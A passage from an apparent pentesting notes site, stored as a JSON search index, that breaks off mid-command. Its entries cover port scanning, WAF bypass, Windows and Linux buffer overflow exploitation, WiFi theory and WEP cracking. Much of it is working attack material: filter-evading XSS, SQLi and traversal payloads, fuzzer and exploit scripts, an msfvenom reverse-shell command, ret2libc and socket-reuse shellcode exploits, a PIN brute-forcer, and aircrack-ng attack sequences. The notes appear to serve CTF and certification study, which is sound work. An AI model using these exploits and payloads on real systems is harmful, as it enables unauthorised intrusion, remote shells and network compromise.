						"content": "The best option to identify Ports, Protocols, and Services (PPS) on a targetwould be to scan all ports (65535) of the remote system. TCP Scanning Nmap Simply Scan nmap -p- --open T5 -v -n IP nmap --top-ports 5000 --open -T5 -v -n IP Complex Scan nmap -sV -A -p PORTS IP Masscan Masscan is the fastest port scanner, it can scan the whole internet in 6 minutes. sudo masscan -p[PORTS] [IP MASK] --rate=1000 -e [IFACE] --router-ip [GATEWAY] Bash Port Scanner This one is created by @s4vitar: #! bin bash # Usage . portScanner.sh IP trap ctrl_c INT function ctrl_c(){ echo -e \"\\n\\n[*] Exiting....\\n\" tput cnorm; exit 0 } for port in $(seq 1 65535);do timeout 1 bash -c \"echo '' &lt; dev tcp $1 $port\" 2&gt; dev null &amp;&amp; echo \"Port $port - OPEN\" &amp; done; wait tput cnorm UDP Scanning Pentesters often forgot to scan for open UDP ports, although UDP scanning can be unrealiable, there are plenty of attack vectors lurking behind open UDP ports. sudo nmap -sU IP Hint: You can launch a syn scan and udp scan at same time: sudo nmap -sS -sU IP"
					}

					
				
			
		
			
				
					,
					

					"enumeration-waf-evasion": {
						"id": "enumeration-waf-evasion",
						"title": "WAF Evasion",
						"category": "",
						"url": " /enumeration/waf-evasion/",
						"content": "In this section I will explain techniques to found the original IP of the hosted webapp. SSL Certificates First we need to look inside the SSL Certificate of the webapp in order to find the fingerprint (SHA256) With censys you can search different hosted webpages with the same SSL fingerprint, so these are from the same company. https: censys.io certificates Once you obtained the different domains or IPs that have the same fingerprint try to discover the IPs and play with the Host HTTP header. curl -kv https: 190.12.34.42 It’s common that the companies buys a range of IPs, so you should need to check more parent IPs. curl -kv https: 190.12.34.40 curl -kv https: 190.12.34.41 curl -kv https: 190.12.34.43 curl -kv https: 190.12.34.44 curl -kv https: 190.12.34.45 curl -kv https: 190.12.34.46 DNS History Some times the companies put a WAF on a web application, but they don’t configure it properly and any source IP instead of only the WAF can request the server. So we can check the DNS history with viewdnsinfo to search the old IP. https: viewdns.info iphistory Finally with suip.biz we can check which apps are hosted on a server. https: suip.biz ?act=hostmap Via SMTP Functionalities SMTP headers can reveal a lot of value information. If a SMTP functionality is found on the web appliaction try to send a mail to a known recipient to check these headers in order to find the real webserver IP. Bypassing blacklisting WAFs The whitelisting mode is prone to false positives, which is the reason it is very common to find WAFs deployed in blacklisting mode rather than whitelisting mode. The blacklisting mode is a collection of well-known attacks. WAF producers put together a list of rules to protect a web application against various attack vectors that are used to exploit the most common vulnerabilities. So we can use different payloads to bypass some filters. Cross-Site Scripting (XSS) Instead of using alert('xss') or alert(1) we can choose a better option: prompt('xss') prompt(8) confirm('xss') confirm(8) alert( xss .source) window[ alert .source](8) Instead of using alert(document.cookie) we can use: with(document)alert(cookie) alert(document['cookie']) alert(document[ cookie .source]) alert(document[ coo .source+ kie .source]) Instead of using &lt;img src=x onerror=alert(1);&gt; we can use: &lt;svg onload=alert(1)&gt; &lt;video src=x onerror=alert(1);&gt; &lt;audio src=x onerror=alert(1);&gt; Instead of javascript:alert(document.cookie) we can use: data:text html:base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4= Blind SQL Injection (Blind SQLi) Instead of using ' or 1=1 we can use: ' or 6=6 ' or 0x47=0x47 or char(32)='' or 6 is not null Instead of UNION SELECT we can use: UNION ALL SELECT Directory Traversal Instead of using etc passwd we can use: too .. etc far .. passwd etc passwd etc ignore .. passwd etc passwd....... Web Shell Instead of using c99.php , r57.php , shell.aspx , cmd.jsp, CmdAsp.asp we can use: augh.php WAF Detection and Fingerprinting WAF systems leave several footprints of their presence, which allow us to detect which WAF is in place. wafw00f is a tool that can detect up to 20 different WAF products. wafw00f www.example.com Also it can be possible to detect the WAF vendor with a nmap script. nmap --script=http-waf-fingerprint www.imperva.com -p 80 Cookie Values Some WAF systems reveal their presence through cookies. WAF Vendor Cookies Citrix Netscaler n_saf, citrix_ns_id or NSC_ F5 BIG-IP ASM ^TS[a-zA-Z0-9]{3,6} Barracuda barra_counter_session and BNI__BARRACUDA_LB_COOKIE Header Rewrite Some WAFs rewrite the HTTP headers. Usually modify the Server header. Original Request HTTP 1.1 200 OK Date: Mon, 7 Apr 2014 10:10:50 GMT Server: Apache (Unix) Content-Type: text html Content-Length: 2506 Modified Request HTTP 1.1 404 Not Found Date: Mon, 7 Apr 2014 10:11:06 GMT Server: Netscape-Enterprise 6.1 Content-Type: text html; Content-Length: 158"
					}

					
				
			
		
			
				
					,
					

					"exploiting-buffer-overflow": {
						"id": "exploiting-buffer-overflow",
						"title": "Buffer Overflow",
						"category": "",
						"url": " /exploiting/buffer-overflow/",
						"content": "Windows 32 bits Stack-Based For that task we are going to use a Windows 7 x64 with Immunity Debugger and mona.py installed. Mona configuration !mona config -set workingfolder c:\\mona\\%p Fuzz to find the vulnerable input fuzzer.py import socket, time, sys ip = \"10.10.95.202\" port = 1337 timeout = 5 buffer = [] counter = 100 while len(buffer) &lt; 30: buffer.append(\"A\" * counter) counter += 100 for string in buffer: try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.settimeout(timeout) connect = s.connect((ip, port)) s.recv(1024) print(\"Fuzzing with %s bytes\" % len(string)) s.send(\"OVERFLOW1 \" + string + \"\\r\\n\") s.recv(1024) s.close() except: print(\"Could not connect to \" + ip + \":\" + str(port)) sys.exit(0) time.sleep(1) Crash Replication &amp; Crontrolling EIP exploit.py import socket ip = \"10.10.95.202\" port = 1337 prefix = \"OVERFLOW1 \" offset = 0 overflow = \"A\" * offset retn = \"\" padding = \"\" payload = \"\" postfix = \"\" buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\"Sending evil buffer...\") s.send(buffer + \"\\r\\n\") print(\"Done!\") except: print(\"Could not connect.\") create a pattern: usr share metasploit-framework tools exploit pattern_create.rb -l 600 And add the output to a payload variable and exploited. take notes about the EIP and search the offset: usr share metasploit-framework tools exploit pattern_offset.rb -q EIP Check adding BBBB value to retn variable. Finding Bad Characters Find the characters that are not accepted on the payload. (REMEMBER FILL THE EIP) !mona bytearray -b \"\\x00\" And add the output to the payload variable (without the offset) Finally compare the binary file with the stack frame specifying the ESP. !mona compare -f C:\\mona\\oscp\\bytearray.bin -a &lt;ESP&gt; Repeat the process adding the new bad characters found until the results status returns UNMODIFIED !mona bytearray -b \"\\x00\\x07\\x2e\\xa0\" Note: If the ESP direction does not match with the beginning of the payload fill it with NOPS (normally is “\\x90”*8) Finding a Jump Point Find all “jmp esp” on the system !mona jmp -r esp -cpb \"\\x00\\x07\\x2e\\xa0\" Remember: Don’t Forget to put the BAD CHARS founded. Log data, item 11 Address=625011AF Message= 0x625011af : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\admin\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) REMBEMBER LITTLE ENDIAN \\x62\\x50\\x11\\xAF (system) -&gt; \\xAF\\x11\\x50\\x62 (exploit) Put the adress on the “retn” variable. If the EIP is the same as ESP you success at jummping to ESP. Generate the Payload We will generate the payload with msfvenom, (DON’T FORGET TO PUT THE FOUND BAD CHARS) msfvenom -a x86 -p windows shell_reverse_tcp LHOST=10.11.21.203 LPORT=4444 EXITFUNC=thread -b \"\\x00\\x07\\x2e\\xa0\" -f py | sed 's buf payload g' Hint: Using EXITFUNC=thread will only finish the thread once termintad the reverse shell without affecting the whole program. -&gt; NO DoS Copy the generated payload ant integrate it into the exploit.py Prepend NOPs We will need some space in memory for the payload to unpack itself, if we added a padding before to match the beginning of the payload with ESP add another 16 NOPS. padding = \"\\x90\" * 16 Linux 32 bits Ret2Libc (Localy) For that task we are going to use a Kali with gdb-peda installed: Running the binary with GDB ❯ gdb rop GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git Copyright (C) 2021 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later &lt;http: gnu.org licenses gpl.html&gt; This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type \"show copying\" and \"show warranty\" for details. This GDB was configured as \"x86_64-linux-gnu\". Type \"show configuration\" for configuration details. For bug reporting instructions, please see: &lt;https: www.gnu.org software gdb bugs &gt;. Find the GDB manual and other documentation resources online at: &lt;http: www.gnu.org software gdb documentation &gt;. For help, type \"help\". Type \"apropos word\" to search for commands related to \"word\"... Reading symbols from rop... (No debugging symbols found in rop) gdb-peda$ r \"Hello World\" Starting program: home mvaliente KaliShared ctf HackTheBox Frolic content rop \"Hello World\" [+] Message sent: Hello World[Inferior 1 (process 379963) exited normally] Warning: not running gdb-peda$ Notice that we get a message in GDB telling us that the the process was detached after a fork from the child process. We can fix that by setting the following commands in GDB. gdb-peda$ set follow-fork-mode child gdb-peda$ set detach-on-fork off Finding the offset Create the pattern Create a randomized pattern in order to find the offset with the EIP value. gdb-peda$ pattern_create 100 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL' Find the offset Run the binary with the pattern. gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL' Starting program: home mvaliente KaliShared ctf HackTheBox Frolic content rop 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL' Program received signal SIGSEGV, Segmentation fault. [----------------------------------registers-----------------------------------] EAX: 0x79 ('y') EBX: 0xffffcd20 --&gt; 0x2 ECX: 0x0 EDX: 0x5f ('_') ESI: 0xf7faa000 --&gt; 0x1e4d6c EDI: 0xf7faa000 --&gt; 0x1e4d6c EBP: 0x31414162 ('bAA1') ESP: 0xffffccf0 (\"AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\") EIP: 0x41474141 ('AAGA') EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] Invalid $PC address: 0x41474141 [------------------------------------stack-------------------------------------] 0000| 0xffffccf0 (\"AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\") 0004| 0xffffccf4 (\"2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\") 0008| 0xffffccf8 (\"AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\") 0012| 0xffffccfc (\"A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\") 0016| 0xffffcd00 (\"IAAeAA4AAJAAfAA5AAKAAgAA6AAL\") 0020| 0xffffcd04 (\"AA4AAJAAfAA5AAKAAgAA6AAL\") 0024| 0xffffcd08 (\"AJAAfAA5AAKAAgAA6AAL\") 0028| 0xffffcd0c (\"fAA5AAKAAgAA6AAL\") [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x41474141 in ?? () gdb-peda$ EIP: 0x41474141 (‘AAGA’) Once we have the EIP we will search the offset value with the pattern: gdb-peda$ pattern_offset 0x41474141 1095188801 found at offset: 52 Offset: 52 Check results Now run the binary with a randomized offset and a controlled EIP like ‘BBBB’. ❯ python3 -c 'print(\"A\"*52 + 'BBBB')' AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB And finally run the binary with the payload gdb-peda$ r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB Starting program: home mvaliente KaliShared ctf HackTheBox Frolic content rop AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB Program received signal SIGSEGV, Segmentation fault. [----------------------------------registers-----------------------------------] EAX: 0x38 ('8') EBX: 0xffffcd50 --&gt; 0x2 ECX: 0x0 EDX: 0x0 ESI: 0xf7faa000 --&gt; 0x1e4d6c EDI: 0xf7faa000 --&gt; 0x1e4d6c EBP: 0x41414141 ('AAAA') ESP: 0xffffcd20 --&gt; 0xffffd000 (\"ared ctf HackTheBox Frolic content rop\") EIP: 0x42424242 ('BBBB') EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] Invalid $PC address: 0x42424242 [------------------------------------stack-------------------------------------] 0000| 0xffffcd20 --&gt; 0xffffd000 (\"ared ctf HackTheBox Frolic content rop\") 0004| 0xffffcd24 --&gt; 0xffffcdf4 --&gt; 0xffffcfea (\" home mvaliente KaliShared ctf HackTheBox Frolic content rop\") 0008| 0xffffcd28 --&gt; 0xffffce00 --&gt; 0xffffd060 (\"COLORFGBG=15;0\") 0012| 0xffffcd2c --&gt; 0x8048561 (&lt;__libc_csu_init+33&gt;: lea eax,[ebx-0xf8]) 0016| 0xffffcd30 --&gt; 0xffffcd50 --&gt; 0x2 0020| 0xffffcd34 --&gt; 0x0 0024| 0xffffcd38 --&gt; 0x0 0028| 0xffffcd3c --&gt; 0xf7de3e46 (&lt;__libc_start_main+262&gt;: add esp,0x10) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x42424242 in ?? () gdb-peda$ EIP: 0x42424242 (‘BBBB’) CORRECT RESULT Check Security With gdb-peda : gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial gdb-peda$ To check ASLR you can check the following file on the target machine: cat proc sys kernel randomize_va_space Checking the results: Result ASLR PIE 0 OFF OFF 1 ON ON 2 OFF OFF Finding Addresses - libc.so.6 ❯ ldd rop linux-gate.so.1 =&gt; (0xb7fda000) libc.so.6 =&gt; lib i386-linux-gnu libc.so.6 (0xb7e19000) lib ld-linux.so.2 (0xb7fdb000) libc.so.6: lib i386-linux-gnu libc.so.6 (0xb7e19000) - system ❯ readelf -s lib i386-linux-gnu libc.so.6 | grep system &lt; .binary$ readelf -s lib i386-linux-gnu libc.so.6 | grep system 245: 00112f20 68 FUNC GLOBAL DEFAULT 13 svcerr_systemerr@@GLIBC_2.0 627: 0003ada0 55 FUNC GLOBAL DEFAULT 13 __libc_system@@GLIBC_PRIVATE 1457: 0003ada0 55 FUNC WEAK DEFAULT 13 system@@GLIBC_2.0 system@@GLIBC_2.0: 0x0003ada0 - exit ❯ readelf -s lib i386-linux-gnu libc.so.6 | grep exit &lt; .binary$ readelf -s lib i386-linux-gnu libc.so.6 | grep exit 112: 0002edc0 39 FUNC GLOBAL DEFAULT 13 __cxa_at_quick_exit@@GLIBC_2.10 141: 0002e9d0 31 FUNC GLOBAL DEFAULT 13 exit@@GLIBC_2.0 450: 0002edf0 197 FUNC GLOBAL DEFAULT 13 __cxa_thread_atexit_impl@@GLIBC_2.18 558: 000b07c8 24 FUNC GLOBAL DEFAULT 13 _exit@@GLIBC_2.0 616: 00115fa0 56 FUNC GLOBAL DEFAULT 13 svc_exit@@GLIBC_2.0 652: 0002eda0 31 FUNC GLOBAL DEFAULT 13 quick_exit@@GLIBC_2.10 876: 0002ebf0 85 FUNC GLOBAL DEFAULT 13 __cxa_atexit@@GLIBC_2.1.3 1046: 0011fb80 52 FUNC GLOBAL DEFAULT 13 atexit@GLIBC_2.0 1394: 001b2204 4 OBJECT GLOBAL DEFAULT 33 argp_err_exit_status@@GLIBC_2.1 1506: 000f3870 58 FUNC GLOBAL DEFAULT 13 pthread_exit@@GLIBC_2.0 2108: 001b2154 4 OBJECT GLOBAL DEFAULT 33 obstack_exit_failure@@GLIBC_2.0 2263: 0002e9f0 78 FUNC WEAK DEFAULT 13 on_exit@@GLIBC_2.0 2406: 000f4c80 2 FUNC GLOBAL DEFAULT 13 __cyg_profile_func_exit@@GLIBC_2.2 exit@@GLIBC_2.0: 0x0002e9d0 - bin sh ❯ strings -atx lib i386-linux-gnu libc.so.6 | grep bin sh &lt; .binary$ strings -atx lib i386-linux-gnu libc.so.6 | grep bin sh 15ba0b bin sh bin sh: 0x0015ba0b Create the exploit This is a template: import struct offset = 52 overflow = \"A\" * offset libc = 0xb7e19000 system = struct.pack('&lt;I', libc + 0x0003ada0) exit = struct.pack('&lt;I', libc + 0x0002e9d0) binsh = struct.pack('&lt;I', libc + 0x0015ba0b) payload = overflow + system + exit + binsh print(payload) Explotation Finally we just need to transfer the file to the target machine and executed ❯ . rop $(python tmp exploit.py) # id uid=0(root) gid=33(www-data) groups=33(www-data) Stack-Based (Remotely) Same as Ret2Libc we need to control the EIP. When we successfuly control the EIP we need to check which security is enabled: gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : disabled PIE : ENABLED RELRO : Partial We can see that PIE is enabled which stands for Position Independent Executable. This means that the memory locations will change every time you run the application. This makes exploiting buffer overflows harder. However, in that example of BoF there was a DEBUG parameter that gave us the location of the buffer overflow-able field. ❯ nc 10.10.10.34 7411 OK Ready. Send USER command. DEBUG OK DEBUG mode on. USER admin OK Send PASS command. PASS admin Debug: userpass buffer @ 0xffffd610 Incorrect username and or password. ERR Authentication failed. Socket Re-Use Instead of spawning a reverse shell that maybe give problems to us with bad characters we can re-use the open socket. The following shellcode works to re-use the socket. buf=b\"\" buf+=b\"\\x6a\\x02\\x5b\\x6a\\x29\\x58\\xcd\\x80\\x48\\x89\\xc6\" buf+=b\"\\x31\\xc9\\x56\\x5b\\x6a\\x3f\\x58\\xcd\\x80\\x41\\x80\" buf+=b\"\\xf9\\x03\\x75\\xf5\\x6a\\x0b\\x58\\x99\\x52\\x31\\xf6\" buf+=b\"\\x56\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\" buf+=b\"\\x89\\xe3\\x31\\xc9\\xcd\\x80\"; https: www.exploit-db.com exploits 34060 Fitting the exploit Finally we just need to fit all parts together and make the exploit: from pwn import * # Initial Configuration context(os=\"linux\", arch=\"i386\") host = \"10.10.10.34\" port = \"7411\" # Junk Bytes junk = b'A' * 28 # UserPass Leaked memory addr = p32(0xffffd610+32) # Payload to reuse the socket buf=b\"\" buf+=b\"\\x6a\\x02\\x5b\\x6a\\x29\\x58\\xcd\\x80\\x48\\x89\\xc6\" buf+=b\"\\x31\\xc9\\x56\\x5b\\x6a\\x3f\\x58\\xcd\\x80\\x41\\x80\" buf+=b\"\\xf9\\x03\\x75\\xf5\\x6a\\x0b\\x58\\x99\\x52\\x31\\xf6\" buf+=b\"\\x56\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\" buf+=b\"\\x89\\xe3\\x31\\xc9\\xcd\\x80\"; payload = junk + addr + buf r = remote(host, port, level='error') r.recvline() r.sendline(\"DEBUG\") r.recvline() r.sendline(\"USER admin\") r.recvline() r.sendline(\"PASS \" + payload) r.interactive() Example pwntools from pwn import * for i in range(0, 9999): code = \"0\" * (4- len(str(i))) + str(i) # r = process(\". mypapp\") r = remote(\"localhost\", 910, level='error') r.recvuntil(\"[$] \") r.sendline(code) response = r.recvline() r.close() if b\"Access denied\" not in response: log.success(\"Valid code found \" + code) break"
					}

					
				
			
		
			
				
					,
					

					"hacking-wifi-theory": {
						"id": "hacking-wifi-theory",
						"title": "Theory",
						"category": "",
						"url": " /hacking-wifi/theory/",
						"content": "It’s an introduction of hacking WiFi, I recollected from the community including others blogs for my own and guides to pass OSWP certificate. Hardware required: An antena that could configure to monitor mode: AWUS036ACH: Wide range 2.4GHz 5GHz Software required: There are some linux distributions like wifislax that could be useful to us, but I used Parrot OS distribution and Kali Linux which have almost all the programs used in that notes, if not install it with apk install aircrack-ng suite hostapd-wpe hashcat JohnTheRipper mdk3 tshark pyrit hccap2john genpmk mysql bettercap hcxdumptool WPSPinGenerator macchanger Introduction Wi-Fi allows networking of computers and digital devices without the need for wires. Data is transferred over radio frequencies, allowing Wi-Fi capable devices to receive and transmit data when they are in range of a Wi-Fi network. Wi-Fi uses a radio technology known as 802.11, which can transmit data over short distances using high frequencies. 802.11 operates on either 2.4GHz or 5GHz depending on its type. To understand how to attack WLAN, we need first to understand how it works. Take a look in detail from networking basis. OSI Model The OSI Model (Open Systems Interconnection Model) is a conceptual framework used to describe the functions of a networking system. The OSI model characterizes computing functions into a universal set of rules and requirements in order to support interoperability between different products and software. In the OSI reference model, the communications between a computing system are split into seven different abstraction layers: Physical, Data Link, Network, Transport, Session, Presentation, and Application. We are going to see Physical Layer and deep on Data link Layer. Physical Layer The physical layer is the lowest layer of the OSI Model and is concerned about how it is transmitted, via electricity, via optical or via radiofrecuence. Contain raw unstructured data bits across the network from the physical layer of the sending device to the physical layer receiving device. In case of WiFi it is transmitted via radiofrecuence. Data Link Layer At the data link layer, directly connected nodes are used to perform node-to-node data transfer where data is packaged into frames. The data link layer corrects error that may have occurred at the physical layer. Its main functions are Data Link Control and Multiple Access Control. Data Link Control The Data Link Control is responsible for reliable transmissions of messages over transmission channel by using techniques like framing, error control and flow control. For Data Link Control refer to Stop and Wait ARQ. Stop and Wait ARQ is a protocol that consist of send a packet and stop sending until we received a confirmation of received or acknowledge (ACK). Multiple Access Control If there is a dedicated link between the sender and the receiver such as a Ethernet wire between two devices then data link control is sufficient, however if there is no dedicated link present then multiple stations can access the channel simultaneously which is the case of Wi-Fi, where all clients try to send in the same medium (air). Then multiple access protocols are required to decrease collisions and avoid cross-talk. Multiple access protocols are divided in: Random Access Protocols In these types of protocols, all stations have the same priority and any station can send data depending on medium’s state, idle or busy. It has two features: There is no fixed time for sending data There is no fixed sequence of stations sending data ALOHA, CSMA, CSMA CD and CSMA CA are random access protocols. Controlled Access Protocols In these types of protocols, the data is sent by a selection which is approved by all other stations. Here appears the significant of “Token”. Reservation, Polling and Token Passing are some of the controlled access protocols. Channelization Protocols Finally, the last type are channelization protocols, where the available bandwidth of the link is shared in time, frequency and code to multiple stations to access channel simultaneously. Frequency Division Multiple Access (FDMA), where the available bandwidth is divided into equals slots so each station can be allocated in its own band. Time Division Multiple Access (TDMA), has the same logic like FDMA but here the time is divided in slots instead of frequency. Code Division Multiple Access (CDMA) where one channel carries all transmissions simultaneously. There is neither division of bandwidth nor division of time. All transmission uses different codes. Introduction to CSMA CA This method was developed to decrease the chances of collisions when two or more stations start sending their signals over the data-link layer. Carrier Sense multiple Access requires that each station check the state of the medium before sending. This protocol is used in 802.11 (WLAN). The basic idea behind CSMA CA is that the station should be able to receive while transmitting to detect a collision from different stations. In wired networks, if a collision occurs then the energy of received signal almost doubles and the station can sense the possibility of collision. In case of wireless networks, most of the energy is used for transmission and the energy of received signal increases by only 5-10% if a collision occurs so it can not be used by the station to sense collision. Therefore CSMA CA has been specially designed for wireless networks because will try to avoid these collisions. There are three types of strategies: InterFrame Space (IFS): When a station finds the channel busy, it waits for a period of time called IFS time. Also can be used to define a priority, if the IFS is higher IFS then the priority decrease. Contention Windows: It is the amount of time divided into slots. A station which is ready to send frames chooses random number of slots as wait time. Acknowledgements: The positive acknowledgements and time-out timer can help to guarantee a successful transmission of the frame. 802.11 Frame Types and Formats There are three types of 802.11 frames, which are management, control and data. Management Frames Management frames are used to manage the base station. This includes probing, associating, roaming and disconnecting clients from the base station. Association Request Response: Stations send association requests to access points (APs) requesting to join the base station or BSS. The AP responds to the station using an association response frame that includes an association ID (AID). Each station within the BSS has a unique AID. Reassociation Request Response: Stations send reassociation request to APs that wish to roam to. The AP responds to the station the same way it does in the association request response. The primary difference between reassociation and association requests it that the station will indicate the current AP it is connected to in reassociation requests. The concept of roaming is to change of AP without loosing connection. (Remember that change AP doesn’t mind change network, maybe a office have a different AP in every floor, each one connected to same router). Probe Request Response: As part of the active and passive scanning processes, stations send probe requests with a specific SSID, wildcard or null value in the SSID field to search for wireless networks. When the field is wildcard or null, the client is requesting any AP nearby to respond with all SSIDs using a probe response frame. When the probe request contains a specific SSID, the client is requesting any AP nearby to respond if they support that SSID. The probe response frame is a targeted beacon that is sent to the station who is “probing”. Beacon: APs send beacons at a regular interval called the target beacon transmit time (TBTT) to advertise the SSIDs they service. Beacons contain the configuration of the WLAN including whether it supports standards, required cipher and authentication key management methods, protection mechanisms etc. Authentication: Authentication frames are used to join the BSS as part of the open system authentication process. Open system authentication is a simple process used to verify that the station attempting to join the BSS has the capabilities to do so. The station sends an authentication request and the AP sends an authentication response. Dissasociation: A type of management frame sent from either the station or the AP. Disassociation frames are used to terminate the stations associations, it is a notification and does not expect a response. APs may disassociate clients for various reasons including failure to properly authenticate, for load balancing or timeout reasons, entering a state of maintenance, etc. Deauthentication: Deauthentication frames are used to reset the state machine for an associated client. The authentication process takes place prior to association therefor, if a station is deauthenticated, it is also disassociated. Deauthentication frames also include a reason code in the body of the frame from the table mentioned above. Action: Action frames are management frames that trigger an action to happen. The list of management frame sub types had become exhausted, so instead of creating new management frames as new technologies required them, the action frame can be used. Action frames do not expect an ACK. Timing Advertisement: Timing advertisement frames were introduced in 802.11p-2010; this standard describes how Wi-Fi can be used in vehicular environments. This type of management frame is not in use today and is expected to be used to communicate time values to devices that cannot maintain their own timing. Control Frames Control frames are used to control access to the medium and are used for frame acknowledgement. Request to Send - RTS: Stations send RTS frames to reserve the medium for the amount of time, in microseconds, found in the duration field in the frame header. The medium will not be reserved for the station until it receives a clear to send frame response from the access point. Clear to Send - CTS: Frame sent by an AP in response to an RTS. CTS messages are sent at the lowest mandatory data rate, allowing them to reach all stations in the BSS. They only use the receiver address (RA) field in the header so the station in the receiver address field is the one that will be transmitting frames. Acknowledgement - ACK: ACK frames create a delivery verification method, they are expected after the transmission of data frames to confirm receipt of the frame. If the CRC check fails, the receiver will not send an ACK and if the sender does not receive an ACK, it will retransmit the frame. PS-Poll: PS-Poll frames are used to power save method to requests framed buffered on the AP while the client was sleeping. Block ACK Block ACK Request: Block acknowledgement are used to confirm receipt of a block of QoS data frames. Beamforming Report Poll: Beamforming report poll frames are sent from the beamformer (the AP) to beamformees (STAs) to request additional feedback about the RF conditions. VHT HE NDP Announcement: Null data packet (NDP) announcement frames notify the recipient that an NDP will follow. Wi-Fi Attacks Now that we look how Wi-Fi is working we will try to attack it. Exists some differents attacks to do in Wi-Fi environments: Rogue Wireless Devices: Create a backdoor to the network installing a AP on a device. Peer-to-peer Attacks: Attack other devices connected to the same AP. Eavesdropping: Monitor wireless communications. Encryption Cracking: Try to crack the encryption on the network. (WEP technologies) Authentication Attacks: Scrap a frame exchange between a client authenticating with the network and then they simply try to run an offline dictionary attack. MAC Spoofing: Change MAC address in order to bypass mac filters on the AP. Management Interface Exploits: Exploit panel admins of the AP or routers exposed to internet. (Default login) Wireless Hijacking: Configure a Evil Twin using the same ESSID as a public hotspot. Denial of Service: Try to modify the availability of the AP. Now that we look how Wi-Fi works we will try to attack it. References: https: blog.ct-networks.io types-of-wireless-attacks-9b6ecc3317b9 https: www.geeksforgeeks.org carrier-sense-multiple-access-csma https: www.geeksforgeeks.org multiple-access-protocols-in-computer-network https: www.ionos.com digitalguide server know-how csmaca-carrier-sense-multiple-access-with-collision-avoidance https: www.geeksforgeeks.org stop-and-wait-arq https: howiwifi.com 2020 07 13 802-11-frame-types-and-formats #:~:text=There are three types of,the layer 3%2D7 information. https: gist.github.com s4vitar 3b42532d7d78bafc824fb28a95c8a5eb https: rootsh3ll.com evil-twin-attack"
					}

					
				
			
		
			
				
					,
					

					"hacking-wifi-wep": {
						"id": "hacking-wifi-wep",
						"title": "Hacking Wifi - WEP",
						"category": "",
						"url": " /hacking-wifi/wep/",
						"content": "Less probabable to find it today but important to have notes about how to attack them. Fake Authentication Attack airmon-ng start wlan0 airodump-ng –c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreCaptura&gt; wlan0mon # Identificamos nuestra MAC macchanger --show wlan0mon aireplay-ng -1 0 -a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; -e &lt;ESSID&gt; wlan0mon aireplay-ng -2 –p 0841 –c FF:FF:FF:FF:FF:FF –b &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon aircrack-ng –b &lt;BSSID&gt; &lt;archivoPCAP&gt; ARP Replay Attack airmon-ng start wlan0 airodump-ng –c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreCaptura&gt; wlan0mon # Identificamos nuestra MAC macchanger --show wlan0mon aireplay-ng -3 –x 1000 –n 1000 –b &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon aircrack-ng –b &lt;BSSID&gt; &lt;archivoPCAP&gt; Chop Chop Attack airmon-ng start wlan0 airodump-ng –c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreArchivo&gt; wlan0mon # Identificamos nuestra MAC macchanger --show wlan0mon aireplay-ng -1 0 –e &lt;ESSID&gt; -a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon aireplay-ng -4 –b &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon # Presionamos ‘y’ ; packetforge-ng -0 –a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; -k &lt;SourceIP&gt; -l &lt;DestinationIP&gt; -y &lt;XOR_PacketFile&gt; -w &lt;FileName2&gt; aireplay-ng -2 –r &lt;FileName2&gt; wlan0mon aircrack-ng &lt;archivoPCAP&gt; Fragmentation Attack airmon-ng start wlan0 airodump-ng –c &lt;Canal_AP&gt; --bssid &lt;BSSID&gt; -w &lt;nombreArchivo&gt; wlan0mon # Identificamos nuestra MAC macchanger --show wlan0mon aireplay-ng -1 0 –e &lt;ESSID&gt; -a &lt;BSSID&gt; -h &lt;nuestraMAC&gt; wlan0mon aireplay-ng -5 –b&lt;BSSID&gt; -h 